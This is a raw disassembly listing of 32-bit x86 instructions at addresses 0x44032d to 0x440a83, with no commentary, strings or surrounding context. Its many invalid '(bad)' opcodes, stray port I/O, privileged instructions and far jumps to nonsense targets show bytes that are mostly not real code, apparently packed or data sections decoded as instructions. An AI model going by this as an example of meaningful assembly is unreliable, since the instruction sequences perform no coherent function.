  44032d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44032e:	les    esi,FWORD PTR [eax]
  440330:	inc    ecx
  440331:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  440332:	in     eax,dx
  440333:	xor    BYTE PTR [edx+0x45],ch
  440336:	mov    DWORD PTR [eax],esi
  440338:	mov    BYTE PTR [ebp-0x2d],0x37
  44033c:	xor    eax,0xb4379131
  440341:	cs pusha 
  440343:	ss mov ebx,0xe33c0041
  440349:	xor    bh,cl
  44034b:	cmp    esp,esi
  44034d:	cmp    edx,ecx
  44034f:	cmp    dl,BYTE PTR [edi]
  440351:	xor    ah,BYTE PTR [ebx+0x283b7d3a]
  440357:	cmp    dl,BYTE PTR [ecx]
  440359:	aas    
  44035a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44035b:	cmp    eax,ecx
  44035d:	sub    eax,0xc6e93879
  440362:	ja     0x44035c
  440364:	popa   
  440365:	jbe    0x440369
  440367:	add    ah,ch
  440369:	or     dh,BYTE PTR es:[eax]
  44036c:	shl    DWORD PTR [esi],1
  44036e:	xchg   ecx,eax
  44036f:	das    
  440370:	jbe    0x440372
  440372:	add    BYTE PTR [eax],al
  440374:	add    BYTE PTR [eax],al
  440376:	mov    eax,es:0xb8c67d2f
  44037c:	das    
  44037d:	add    BYTE PTR [ecx+0x7e30c553],bl
  440383:	push   ebx
  440384:	shl    DWORD PTR [eax],1
  440386:	adc    DWORD PTR [ebx-0x1a],0x30
  44038a:	fcom   QWORD PTR [ebx+0x1e]
  44038d:	xor    DWORD PTR [ebx+edx*2+0x53a1312f],ebp
  440394:	inc    edi
  440395:	xor    edx,edi
  440397:	push   ebx
  440398:	push   esi
  440399:	xor    DWORD PTR [edi],edi
  44039b:	push   esp
  44039c:	mov    edx,0xfb547431
  4403a1:	xor    ebx,esi
  4403a3:	dec    esp
  4403a4:	mov    eax,0x334db032
  4403a9:	xor    ebp,DWORD PTR [ebp+0x47]
  4403ac:	push   cs
  4403ad:	xor    eax,0x36e94812
  4403b2:	add    eax,DWORD PTR [ebp+0x6d]
  4403b5:	cmp    ch,bh
  4403b7:	dec    ebx
  4403b8:	retf   
  4403b9:	cmp    bh,BYTE PTR [eax+0x49]
  4403bc:	aaa    
  4403bd:	cmp    ebx,eax
  4403bf:	dec    ecx
  4403c0:	sar    DWORD PTR [ebx],cl
  4403c2:	cmp    cl,BYTE PTR [edx-0x10]
  4403c5:	cmp    esp,DWORD PTR [edi+0x3e]
  4403c8:	test   BYTE PTR [edi*8+0x433ca44a],bh
  4403cf:	dec    ebx
  4403d0:	sub    eax,0xa34b833d
  4403d5:	cmp    eax,0x3e394026
  4403da:	add    BYTE PTR [eax],al
  4403dc:	add    BYTE PTR [eax],al
  4403de:	add    cl,al
  4403e0:	cmp    al,0xd0
  4403e2:	ds dec eax
  4403e4:	cmp    eax,0x3d893f1f
  4403e9:	outs   dx,DWORD PTR ds:[esi]
  4403ea:	aas    
  4403eb:	mov    ebx,0x933fdc3d
  4403f0:	cmp    eax,0x421cfff8
  4403f5:	clc    
  4403f6:	(bad)  
  4403f7:	in     al,dx
  4403f8:	(bad)  
  4403f9:	(bad)  
  4403fa:	push   DWORD PTR [ebp-0x50]
  4403fd:	int3   
  4403fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4403ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  440400:	and    al,0xd4
  440402:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  440404:	dec    esp
  440405:	rol    DWORD PTR [ebx-0x462d7c5c],cl
  44040b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44040c:	adc    dl,bl
  44040e:	push   cs
  44040f:	xchg   DWORD PTR [esi-0x32],ebp
  440412:	cmp    eax,0xa8cdf087
  440417:	xchg   DWORD PTR [ebx],ecx
  440419:	into   
  44041a:	out    dx,al
  44041b:	xchg   DWORD PTR [edx-0x33],esp
  44041e:	sub    al,0x66
  440420:	mov    eax,ds:0xc96666cd
  440425:	int3   
  440426:	cmp    BYTE PTR [ecx-0x67],ch
  440429:	enter  0x6171,0x77
  44042d:	enter  0x4817,0xa9
  440431:	iret   
  440432:	push   0x7bced640
  440437:	dec    eax
  440438:	jmp    0x4ca:0x66408acf
  44043f:	stos   DWORD PTR es:[edi],eax
  440440:	(bad)  
  440441:	leave  
  440442:	xchg   BYTE PTR [eax],al
  440444:	add    BYTE PTR [eax],al
  440446:	add    BYTE PTR [eax],al
  440448:	mov    ds:0xaa90c934,eax
  44044d:	and    eax,0xec9d9acc
  440452:	les    ecx,FWORD PTR [ebx+0x10c5698c]
  440458:	mov    cs,WORD PTR [esi-0x3b]
  44045b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44045c:	jle    0x44043f
  44045e:	(bad)
  440461:	xchg   esp,eax
  440462:	lds    edx,FWORD PTR [eax]
  440464:	jno    0x4404a9
  440466:	shl    BYTE PTR [ecx],0x69
  440469:	pop    ss
  44046a:	enter  0x615b,0x1
  44046e:	enter  0x5988,0xd6
  440472:	rcr    BYTE PTR [esi],0x50
  440475:	mov    ah,0xc7
  440477:	or     BYTE PTR [eax+0x2],0x8c
  44047b:	enter  0x36cb,0x27
  44047f:	enter  0x371b,0x3f
  440483:	enter  0x3484,0xb3
  440487:	lds    edx,FWORD PTR [edx+0x34]
  44048a:	lds    ebx,FWORD PTR fs:0x8ec51234
  440491:	xor    eax,0x3558c6a8
  440496:	xor    eax,0xe734c2c6
  44049b:	mov    bl,0xc2
  44049d:	je     0x440449
  44049f:	add    esi,DWORD PTR [ebp+0x2]
  4404a2:	leave  
  4404a3:	shr    DWORD PTR [eax+0x32],cl
  4404a6:	scas   eax,DWORD PTR es:[edi]
  4404a7:	rcr    DWORD PTR [edi],cl
  4404a9:	xor    dl,BYTE PTR [ebp-0x2d]
  4404ac:	add    BYTE PTR [eax],al
  4404ae:	add    BYTE PTR [eax],al
  4404b0:	add    dh,bh
  4404b2:	xor    DWORD PTR [esi-0x2d],eax
  4404b5:	mov    eax,ds:0x45d4ca31
  4404ba:	xor    esi,DWORD PTR ds:0x603059d4
  4404c0:	shl    BYTE PTR [edi],cl
  4404c2:	xor    ebp,ebp
  4404c4:	iret   
  4404c5:	ss cs inc edx
  4404c8:	shl    BYTE PTR [esi+0x9cf3b2d],1
  4404ce:	cs scas al,BYTE PTR es:[edi]
  4404d0:	iret   
  4404d1:	push   ecx
  4404d2:	cs pop eax
  4404d4:	into   
  4404d5:	sub    al,0x2c
  4404d7:	pushf  
  4404d8:	int    0x47
  4404da:	sub    al,0x36
  4404dc:	int3   
  4404dd:	out    0x39,eax
  4404df:	call   0xd4c9:0x663760cb
  4404e6:	ss mov edx,0xe73498c7
  4404ec:	mov    ds:0x3c6742a,eax
  4404f1:	jne    0x4404f5
  4404f3:	xlat   BYTE PTR ds:[ebx]
  4404f4:	sar    BYTE PTR [ecx+0x4003002b],cl
  4404fa:	jecxz  0x440533
  4404fc:	(bad)  
  4404fd:	ds xchg ebp,eax
  4404ff:	ss xchg ecx,eax
  440501:	cs sub al,0x3c
  440504:	push   ds
  440505:	sub    eax,0xbb86399c
  44050a:	pop    edi
  44050b:	cmp    ecx,ebp
  44050d:	push   es
  44050e:	je     0x440508
  440510:	std    
  440511:	jbe    0x440515
  440513:	add    dl,cl
  440515:	add    BYTE PTR [eax],al
  440517:	add    BYTE PTR [eax],al
  440519:	add    ah,al
  44051b:	jns    0x44054f
  44051d:	nop
  44051e:	shl    BYTE PTR [edx+0x31],0xd0
  440522:	mov    ecx,0xb07c30cb
  440527:	push   ecx
  440528:	xor    bh,bh
  44052a:	scas   al,BYTE PTR es:[edi]
  44052b:	aad    0x37
  44052d:	dec    esi
  44052e:	rcr    DWORD PTR [ebx+0x37],0x99
  440532:	mov    edi,0xaf0a3601
  440537:	push   DWORD PTR [ecx+edi*4]
  44053a:	lods   eax,DWORD PTR ds:[esi]
  44053b:	jl     0x440571
  44053d:	and    bh,BYTE PTR [esi+edx*2+0x73b2e634]
  440544:	clc    
  440545:	jmp    0x123c78c0
  44054a:	jbe    0x44054e
  44054c:	add    BYTE PTR [eax+0x49],al
  44054f:	imul   BYTE PTR [esi]
  440551:	inc    di
  440553:	jle    0x440583
  440555:	jbe    0x44059e
  440557:	xchg   BYTE PTR [esi],ch
  440559:	push   esi
  44055a:	inc    edi
  44055b:	mov    gs,WORD PTR [esi]
  44055d:	push   esi
  44055e:	daa    
  44055f:	xchg   esi,eax
  440560:	xchg   BYTE PTR cs:[edi],ah
  440563:	sahf   
  440564:	cs push esi
  440566:	daa    
  440567:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  440568:	cs push esi
  44056a:	daa    
  44056b:	scas   al,BYTE PTR es:[edi]
  44056c:	cs push esi
  44056e:	inc    edi
  44056f:	mov    dh,0x2e
  440571:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  440572:	inc    edi
  440573:	ds cs add bl,ch
  440577:	dec    edi
  440578:	retf   
  440579:	xor    DWORD PTR [ebx],eax
  44057b:	push   eax
  44057c:	shl    DWORD PTR [ecx],cl
  44057e:	add    BYTE PTR [eax],al
  440580:	add    BYTE PTR [eax],al
  440582:	add    bl,ch
  440584:	dec    edi
  440585:	(bad)  [ecx]
  440587:	repz dec edi
  440589:	jecxz  0x4405bc
  44058b:	stos   DWORD PTR es:[edi],eax
  44058c:	push   eax
  44058d:	jmp    0x4405c0
  44058f:	mov    ds:0x4b31f350,eax
  440594:	push   eax
  440595:	sti    
  440596:	xor    ebx,edx
  440598:	push   eax
  440599:	add    esi,DWORD PTR [edx]
  44059b:	jmp    0x4405ed
  44059d:	or     esi,DWORD PTR [edx]
  44059f:	ret    
  4405a0:	push   eax
  4405a1:	adc    esi,DWORD PTR [edx]
  4405a3:	stos   DWORD PTR es:[edi],eax
  4405a4:	push   eax
  4405a5:	sbb    esi,DWORD PTR [edx]
  4405a7:	jae    0x4405f9
  4405a9:	and    esi,DWORD PTR [edx]
  4405ab:	stos   DWORD PTR es:[edi],eax
  4405ac:	push   eax
  4405ad:	sub    esi,DWORD PTR [edx]
  4405af:	mov    ds:0xcb323350,eax
  4405b4:	push   eax
  4405b5:	cmp    esi,DWORD PTR [edx]
  4405b7:	rcl    DWORD PTR [eax+0x43],cl
  4405ba:	xor    ch,bl
  4405bc:	push   eax
  4405bd:	dec    ebx
  4405be:	xor    al,BYTE PTR [ebx]
  4405c0:	push   ecx
  4405c1:	push   ebx
  4405c2:	xor    ch,bl
  4405c4:	push   eax
  4405c5:	pop    ebx
  4405c6:	xor    dh,bl
  4405c8:	push   eax
  4405c9:	arpl   WORD PTR [edx],si
  4405cb:	sub    ebp,DWORD PTR [ebx+ebp*2]
  4405ce:	xor    ah,BYTE PTR [ebx]
  4405d0:	sub    al,0x73
  4405d2:	xor    cl,bl
  4405d4:	cmp    BYTE PTR [ebx+0x32],bh
  4405d7:	sar    DWORD PTR [eax],cl
  4405d9:	xor    DWORD PTR [edx],0xffffffeb
  4405dc:	cmp    BYTE PTR [ebx-0x6cc73cce],cl
  4405e2:	xor    ch,BYTE PTR [ebx+0x329b38]
  4405e8:	add    BYTE PTR [eax],al
  4405ea:	add    BYTE PTR [eax],al
  4405ec:	repz cmp BYTE PTR [ebx],bl
  4405ef:	xor    esi,DWORD PTR [ebx]
  4405f1:	cmp    DWORD PTR [ebx],esp
  4405f3:	xor    ebp,DWORD PTR [ebx]
  4405f5:	cmp    DWORD PTR [ebx],ebp
  4405f7:	xor    esi,DWORD PTR [ebp+0x50]
  4405fa:	xor    DWORD PTR ds:0x3d314066,esi
  440600:	data16 and BYTE PTR [ecx],dh
  440603:	inc    ebp
  440604:	data16 and BYTE PTR [ecx],dh
  440607:	dec    ebp
  440608:	inc    esi
  440609:	adc    BYTE PTR [ecx],dh
  44060b:	push   ebp
  44060c:	inc    esi
  44060d:	add    BYTE PTR [ecx],dh
  44060f:	pop    ebp
  440610:	inc    esi
  440611:	inc    eax
  440612:	xor    DWORD PTR [ebp+0x46],esp
  440615:	inc    eax
  440616:	xor    DWORD PTR [ebp-0x5a],ebp
  440619:	push   eax
  44061a:	xor    DWORD PTR [ebp-0x5a],esi
  44061d:	inc    eax
  44061e:	xor    DWORD PTR [ebp-0x5a],edi
  440621:	loopne 0x440653
  440623:	test   DWORD PTR [esi-0x7972cf20],esp
  440629:	shl    BYTE PTR [eax],1
  44062b:	xchg   ebp,eax
  44062c:	xchg   al,al
  44062e:	xor    BYTE PTR [ebp-0x5acf3f7a],bl
  440634:	xchg   al,al
  440636:	xor    BYTE PTR [ebp-0x4acf2f9a],ch
  44063c:	data16 shl BYTE PTR [eax],0xbd
  440640:	data16 and BYTE PTR [ecx],dh
  440643:	lds    esp,FWORD PTR [esi+0x20]
  440646:	xor    ebp,ecx
  440648:	inc    esi
  440649:	adc    BYTE PTR [ecx],dh
  44064b:	aad    0x46
  44064d:	add    BYTE PTR [ecx],dh
  44064f:	test   BYTE PTR [eax],al
  440651:	add    BYTE PTR [eax],al
  440653:	add    BYTE PTR [eax],al
  440655:	dec    ecx
  440656:	sub    esi,DWORD PTR [esi]
  440658:	xchg   DWORD PTR [edi],edi
  44065a:	dec    esp
  44065b:	cmp    cl,BYTE PTR [ebx]
  44065d:	scas   al,BYTE PTR es:[edi]
  44065e:	xor    edi,DWORD PTR [ecx]
  440660:	pop    ebx
  440661:	scas   al,BYTE PTR es:[edi]
  440662:	leave  
  440663:	cmp    BYTE PTR [ebx-0x34c67962],dh
  440669:	sahf   
  44066a:	mov    ds:0x7b915c39,eax
  44066f:	cmp    BYTE PTR [eax+0x353e0789],bh
  440675:	add    DWORD PTR [edx],0x43
  440678:	inc    edx
  440679:	enter  0xee30,0x42
  44067d:	ds xor edi,esp
  440680:	adc    ebp,DWORD PTR [edx]
  440682:	jno    0x44067e
  440684:	add    esi,DWORD PTR [ebp+0x2]
  440687:	and    BYTE PTR [ebx+ecx*4],dh
  44068a:	xor    bh,BYTE PTR [edi+0x35]
  44068d:	js     0x4406c4
  44068f:	add    dh,BYTE PTR [edi]
  440691:	std    
  440692:	xor    al,0x3f
  440694:	shl    BYTE PTR ss:[edx+eax*2],1
  440698:	ss dec ecx
  44069a:	ss fs aaa 
  44069d:	push   ss
  44069e:	ss xchg ebp,eax
  4406a0:	aaa    
  4406a1:	sub    DWORD PTR [esi],esi
  4406a3:	and    al,0x37
  4406a5:	mov    cl,0x35
  4406a7:	dec    edx
  4406a8:	aaa    
  4406a9:	js     0x4406e2
  4406ab:	cld    
  4406ac:	cmp    BYTE PTR [esi+0x38],bh
  4406af:	sar    DWORD PTR [ecx],cl
  4406b1:	inc    esp
  4406b2:	cmp    BYTE PTR [eax+0x39],ah
  4406b5:	in     eax,0x37
  4406b7:	inc    edi
  4406b8:	cmp    DWORD PTR [eax],eax
  4406ba:	add    BYTE PTR [eax],al
  4406bc:	add    BYTE PTR [eax],al
  4406be:	mov    ch,0x37
  4406c0:	cmp    DWORD PTR cs:[edx],edx
  4406c3:	sub    ah,BYTE PTR [edx-0x11d4f0c4]
  4406c9:	cmp    eax,0x3e2d2d19
  4406ce:	mov    esp,0x573fdb2c
  4406d3:	cs sub al,0x3f
  4406d6:	push   ss
  4406d7:	das    
  4406d8:	dec    esi
  4406d9:	inc    eax
  4406da:	enter  0xb72e,0x3f
  4406de:	xchg   edi,eax
  4406df:	cs repnz inc eax
  4406e2:	(bad)  
  4406e3:	das    
  4406e4:	or     eax,DWORD PTR [ecx-0x5b]
  4406e7:	das    
  4406e8:	and    al,0x41
  4406ea:	shr    DWORD PTR [edi],cl
  4406ec:	inc    eax
  4406ed:	inc    ecx
  4406ee:	sub    al,0x30
  4406f0:	out    0x23,eax
  4406f2:	push   edx
  4406f3:	jo     0x4406f4
  4406f5:	xor    BYTE PTR [ecx+0x2],0x0
  4406f9:	loop   0x440681
  4406fb:	or     dh,BYTE PTR [eax]
  4406fd:	loope  0x440685
  4406ff:	(bad)  
  440700:	das    
  440701:	push   ss
  440702:	imul   ecx,DWORD PTR [edi+ebp*1+0x2fb4614e],0x2f1a67f0
  44070d:	(bad)  
  44070e:	addr16 jmp 0x44073f
  440711:	push   eax
  440712:	inc    esi
  440713:	pusha  
  440714:	cs mov edx,0x672dcd40
  44071a:	dec    ebx
  44071b:	mov    DWORD PTR ds:0x2d9c438e,ebp
  440721:	xchg   ebp,eax
  440722:	add    BYTE PTR [eax],al
  440724:	add    BYTE PTR [eax],al
  440726:	add    BYTE PTR [ebx-0x5cd4d252],ch
  44072c:	cmp    ch,BYTE PTR ds:0x2d54ab1f
  440732:	and    eax,0x522d63a3
  440737:	mov    esi,DWORD PTR [esi+0x2d]
  44073a:	xor    al,BYTE PTR [ebx-0x77fcd2fe]
  440740:	and    BYTE PTR ds:0x2d2981e0,ch
  440746:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  440747:	imul   edi,DWORD PTR [ebx-0x289e45d4],0xe169882c
  440751:	sub    al,0x79
  440753:	popa   
  440754:	hlt    
  440755:	sub    al,0x7e
  440757:	dec    ecx
  440758:	test   BYTE PTR [edx+eiz*2],ch
  44075b:	inc    eax
  44075c:	push   eax
  44075d:	sub    al,0xb1
  44075f:	dec    edx
  440760:	mov    esp,0x5f3d4e33
  440765:	xor    eax,DWORD PTR [eax-0x56]
  440768:	repz xor dl,BYTE PTR [esi-0x5e]
  44076c:	js     0x4407a0
  44076e:	dec    ecx
  44076f:	lahf   
  440770:	cdq    
  440771:	xor    BYTE PTR [eax],al
  440773:	push   ss
  440774:	sub    bl,bh
  440776:	aaa    
  440777:	xor    BYTE PTR [ebx],ch
  440779:	pop    esi
  44077a:	cmp    BYTE PTR [eax+0x2c],bl
  44077d:	cmp    DWORD PTR es:[edi+0x7e3b2f2b],ebp
  440784:	sub    eax,0x2f483b71
  440789:	stc    
  44078a:	cmp    al,0x0
  44078c:	add    BYTE PTR [eax],al
  44078e:	add    BYTE PTR [eax],al
  440790:	shr    DWORD PTR [edi],cl
  440792:	aaa    
  440793:	ds add ah,0x56
  440797:	ds test esp,eax
  44079a:	lods   al,BYTE PTR ds:[esi]
  44079b:	ds nop
  44079d:	rol    DWORD PTR [esi],0x3f
  4407a0:	and    eax,0xc3ff0c2
  4407a5:	xor    edi,ecx
  4407a7:	(bad)  
  4407a8:	jl     0x4407ad
  4407aa:	add    BYTE PTR [eax],al
  4407ac:	fidiv  DWORD PTR [ebx]
  4407ae:	add    eax,0xcd338c31
  4407b3:	xor    DWORD PTR [ebx+0x34],ecx
  4407b6:	les    esi,FWORD PTR [edx]
  4407b8:	and    al,0x37
  4407ba:	data16 xor al,0x3
  4407bd:	aaa    
  4407be:	int    0x34
  4407c0:	stos   BYTE PTR es:[edi],al
  4407c1:	aaa    
  4407c2:	(bad)  
  4407c3:	xor    eax,0x3647388e
  4407c8:	mov    al,0x28
  4407ca:	jp     0x440802
  4407cc:	cmc    
  4407cd:	sub    BYTE PTR [eax+0x3329ac36],ah
  4407d3:	aaa    
  4407d4:	daa    
  4407d5:	sub    al,BYTE PTR [eax+0x38]
  4407d8:	sbb    BYTE PTR [ebx],ch
  4407da:	sahf   
  4407db:	cmp    BYTE PTR [ebp+0x2b],al
  4407de:	pop    es
  4407df:	cmp    eax,edx
  4407e1:	sub    ecx,DWORD PTR [ecx+edi*1+0x398f2c1d]
  4407e8:	fild   QWORD PTR [edi+eax*8]
  4407eb:	cmp    DWORD PTR [ebp+0x2c],esp
  4407ee:	cmp    eax,0x35d2753a
  4407f3:	test   DWORD PTR [eax],eax
  4407f5:	add    BYTE PTR [eax],al
  4407f7:	add    BYTE PTR [eax],al
  4407f9:	lahf   
  4407fa:	lock xor eax,0x35e89fa5
  440800:	aad    0x8f
  440802:	stos   BYTE PTR es:[edi],al
  440803:	xor    eax,0x354c8ff6
  440808:	sub    al,0x7e
  44080a:	pop    ebp
  44080b:	xor    eax,0x34f87e5c
  440810:	outs   dx,BYTE PTR ds:[si]
  440812:	or     dh,BYTE PTR ds:0x34eb6e71
  440818:	cwde   
  440819:	pop    esi
  44081a:	retf   0x1234
  44081d:	pop    ecx
  44081e:	cmp    bh,BYTE PTR [eax]
  440820:	dec    ecx
  440821:	push   ecx
  440822:	imul   edi,DWORD PTR [eax],0x64
  440825:	dec    eax
  440826:	loope  0x440866
  440828:	fadd   DWORD PTR [eax+0x71]
  44082b:	cmp    ah,BYTE PTR [eax-0x33c5e5c5]
  440831:	mov    bl,0xca
  440833:	cmp    DWORD PTR [ecx],ebx
  440835:	stos   BYTE PTR es:[edi],al
  440836:	add    DWORD PTR [ecx],edi
  440838:	add    BYTE PTR [ebp+0x5b],dh
  44083b:	mov    esp,0xfcafdafe
  440840:	push   DWORD PTR [ebp-0x4d]
  440843:	sub    al,0xa3
  440845:	test   DWORD PTR [esi],edi
  440847:	xor    eax,DWORD PTR [esp+eax*4-0x7b2eccda]
  44084e:	pop    esp
  44084f:	cs dec edi
  440851:	addr16 stc 
  440853:	sub    eax,0x2d5367fe
  440858:	mov    DWORD PTR [esi+0x1c],esp
  44085b:	sub    eax,0x69
  440860:	add    BYTE PTR [eax],al
  440862:	popa   
  440863:	mov    edi,0xcb4b8837
  440868:	xor    ah,bl
  44086a:	inc    edx
  44086b:	cld    
  44086c:	xor    cl,dh
  44086e:	dec    edx
  44086f:	test   eax,0x23d3534
  440874:	mov    WORD PTR [ebx],?
  440876:	cmp    DWORD PTR [edx],ebp
  440878:	mov    edi,0xf52a603b
  44087d:	cmp    al,0x8d
  44087f:	sub    ebx,DWORD PTR [edi*1+0x3c742bbe]
  440886:	push   ss
  440887:	sub    eax,ebx
  440889:	cmp    al,0x4a
  44088b:	sub    ebx,esi
  44088d:	cmp    DWORD PTR [eax+0x28],esi
  440890:	int    0x39
  440892:	jns    0x4408bc
  440894:	sub    bh,BYTE PTR [edx]
  440896:	les    ebp,FWORD PTR [eax]
  440898:	adc    BYTE PTR [edx],bh
  44089a:	sti    
  44089b:	daa    
  44089c:	pop    eax
  44089d:	cmp    DWORD PTR ds:0x2a399b28,esi
  4408a3:	sub    BYTE PTR [ecx+0x2528d239],bl
  4408a9:	inc    ecx
  4408aa:	stos   BYTE PTR es:[edi],al
  4408ab:	sub    al,0x15
  4408ad:	aas    
  4408ae:	test   DWORD PTR ds:0x2753eea,ebp
  4408b4:	out    0xd3,eax
  4408b6:	rep ins BYTE PTR es:[edi],dx
  4408b8:	into   
  4408b9:	add    esi,DWORD PTR [ebp+0x2]
  4408bc:	jg     0x4408f2
  4408be:	cld    
  4408bf:	das    
  4408c0:	inc    ebp
  4408c1:	xor    DWORD PTR [ecx+esi*1+0x70],ebx
  4408c5:	xor    al,BYTE PTR [eax]
  4408c7:	add    BYTE PTR [eax],al
  4408c9:	add    BYTE PTR [eax],al
  4408cb:	push   DWORD PTR [eax]
  4408cd:	push   ebx
  4408ce:	xor    ch,BYTE PTR [edi+0x3d324b30]
  4408d4:	aaa    
  4408d5:	inc    ecx
  4408d6:	cmp    BYTE PTR [ecx+0x34],bh
  4408d9:	xchg   edi,eax
  4408da:	xor    eax,0x368033d8
  4408df:	(bad)  [ebx+ebx*4]
  4408e2:	cmp    ebp,DWORD PTR [eax]
  4408e4:	sub    ch,BYTE PTR [eax+0x3b]
  4408e7:	jmp    0xd37f5415
  4408ec:	sub    DWORD PTR [ecx],ebp
  4408ee:	cmp    ecx,DWORD PTR [ebp+0x41df0029]
  4408f4:	shl    BYTE PTR [esi],0x93
  4408f7:	cmp    DWORD PTR [esi*1+0x346aac68],esp
  4408fe:	out    0xaa,al
  440900:	or     BYTE PTR [edx+eiz*8],bh
  440903:	mov    ds:0x9a5b3ac7,eax
  440908:	(bad)  
  440909:	cmp    al,ah
  44090b:	xchg   edx,eax
  44090c:	fdivr  DWORD PTR [eax]
  44090e:	xor    eax,0x7c389888
  440913:	add    BYTE PTR [eax+0x38],0x9d
  440917:	js     0x44096f
  440919:	cmp    dh,al
  44091b:	jo     0x440993
  44091d:	cmp    BYTE PTR [ebx-0x16fffd98],ah
  440923:	push   ss
  440924:	ins    DWORD PTR es:[edi],dx
  440925:	clc    
  440926:	sbb    DWORD PTR [ecx+0x2],esi
  440929:	add    BYTE PTR [edi-0x4ad0ebb7],dl
  44092f:	add    BYTE PTR [eax],al
  440931:	add    BYTE PTR [eax],al
  440933:	add    BYTE PTR [edi+0x35],al
  440936:	das    
  440937:	adc    al,0x46
  440939:	fisubr WORD PTR [esi]
  44093b:	pop    edx
  44093c:	inc    esi
  44093d:	push   esi
  44093e:	cs push edi
  440940:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  440941:	adc    BYTE PTR [esi],ch
  440943:	or     eax,0xa92e30a7
  440948:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  440949:	cmp    al,0x2d
  44094b:	pop    ss
  44094c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44094d:	shr    DWORD PTR [esi+eiz*4],1
  440950:	test   DWORD PTR [ecx+0x2c],edi
  440953:	icebp  
  440954:	sbb    BYTE PTR [esi],0x34
  440957:	test   eax,0x6133ef8a
  44095c:	jge    0x4408f1
  44095e:	xor    edi,DWORD PTR ds:0x15335a6d
  440964:	ins    DWORD PTR es:[edi],dx
  440965:	jne    0x44099a
  440967:	in     al,0x6b
  440969:	or     DWORD PTR [ebx],esi
  44096b:	shl    DWORD PTR [ebx-0x32],cl
  44096e:	xor    al,BYTE PTR [eax]
  440970:	shl    BYTE PTR ds:0x35473663,cl
  440976:	ss cmp bh,dl
  440979:	daa    
  44097a:	mov    ch,0x38
  44097c:	push   edi
  44097d:	sbb    DWORD PTR cs:[ecx],edi
  440980:	lds    esp,FWORD PTR [edi]
  440982:	cmp    DWORD PTR [ecx],0x3a2a295a
  440988:	xchg   ecx,eax
  440989:	sub    BYTE PTR [esi+0x3a],bl
  44098c:	mov    esi,0xeb3a8328
  440991:	sub    bh,bh
  440993:	cmp    dh,BYTE PTR [edx+0x29]
  440996:	add    BYTE PTR [eax],al
  440998:	add    BYTE PTR [eax],al
  44099a:	add    BYTE PTR [eax],al
  44099c:	add    BYTE PTR [edi+ebp*2-0x7],cl
  4409a0:	push   DWORD PTR [eax+0x6]
  4409a3:	add    BYTE PTR [eax],al
  4409a5:	cmp    esp,DWORD PTR [edi]
  4409a7:	aad    0x3a
  4409a9:	push   0xffffffc2
  4409ab:	addr16 cmp al,0xaa
  4409ae:	sub    esi,DWORD PTR [ebp+edi*1+0x3df02be0]
  4409b5:	cmc    
  4409b6:	sub    ebx,DWORD PTR [esi]
  4409b8:	ds xchg esp,eax
  4409ba:	sub    eax,0x2df53ec3
  4409bf:	add    BYTE PTR [eax],al
  4409c1:	or     al,0x7f
  4409c3:	stc    
  4409c4:	call   eax
  4409c6:	(bad)  
  4409c7:	(bad)  
  4409c8:	call   DWORD PTR [ebx+0x2f]
  4409cb:	in     al,dx
  4409cc:	xor    ah,dl
  4409ce:	das    
  4409cf:	xchg   edi,eax
  4409d0:	xor    DWORD PTR [ecx+esi*1+0x34a335b9],ecx
  4409d7:	outs   dx,DWORD PTR ds:[esi]
  4409d8:	ss (bad) 
  4409da:	xor    eax,0x35ac3717
  4409df:	imul   esi,DWORD PTR [edi],0x37c5361f
  4409e5:	cmp    DWORD PTR [esi],esi
  4409e7:	push   cs
  4409e8:	cmp    cl,ah
  4409ea:	es pop ebp
  4409ec:	cmp    BYTE PTR [ebp-0x7b],dh
  4409ef:	xor    al,0x6d
  4409f1:	pop    ebp
  4409f2:	xchg   edx,eax
  4409f3:	xor    al,0x86
  4409f5:	dec    ebp
  4409f6:	leave  
  4409f7:	xor    al,0x98
  4409f9:	dec    ebp
  4409fa:	or     eax,0xa63c0f35
  4409ff:	xor    eax,0x87
  440a04:	add    BYTE PTR [eax],al
  440a06:	cmp    al,0xf8
  440a08:	xor    eax,0x39e3af61
  440a0d:	mov    dl,0xaf
  440a0f:	dec    ebp
  440a10:	cmp    DWORD PTR [edx-0x46c8785f],edx
  440a16:	cdq    
  440a17:	pop    ecx
  440a18:	aaa    
  440a19:	cmp    eax,0xc2367f90
  440a1e:	mov    BYTE PTR [esi-0x557f1bca],cl
  440a24:	ss and eax,0xd435a47b
  440a2a:	jae    0x4409b6
  440a2c:	xor    eax,0x35356a1c
  440a31:	dec    ecx
  440a32:	bound  ebx,QWORD PTR [esi-0x7ca531cc]
  440a38:	xor    al,0x0
  440a3a:	jne    0x440a97
  440a3c:	mov    esi,?
  440a3e:	or     cl,BYTE PTR [eax]
  440a40:	add    al,0x0
  440a42:	jne    0x4409f1
  440a44:	sub    al,0xf3
  440a46:	inc    ebp
  440a47:	stos   DWORD PTR es:[edi],eax
  440a48:	xor    edx,DWORD PTR [edx-0x5c]
  440a4b:	push   ebp
  440a4c:	xor    edx,DWORD PTR [ebp+0x1c331ba4]
  440a52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  440a53:	push   esp
  440a54:	xor    dl,BYTE PTR [edi+eiz*4-0x7924ce8a]
  440a5b:	sub    eax,0x15810a31
  440a60:	xor    BYTE PTR [esi],bh
  440a62:	mov    DWORD PTR [ecx-0x767eb9d8],ebx
  440a68:	sub    BYTE PTR [esi+0x0],cl
  440a6b:	add    BYTE PTR [eax],al
  440a6d:	add    BYTE PTR [eax],al
  440a6f:	imul   eax,DWORD PTR [edx],0x2e432fb9
  440a75:	mov    ecx,0x892e432f
  440a7a:	das    
  440a7b:	adc    ebp,DWORD PTR [esi]
  440a7d:	jns    0x440aae
  440a7f:	and    ebp,DWORD PTR [esi]
  440a81:	jns    0x440ab2
  440a83:	add    ebp,DWORD PTR [esi]
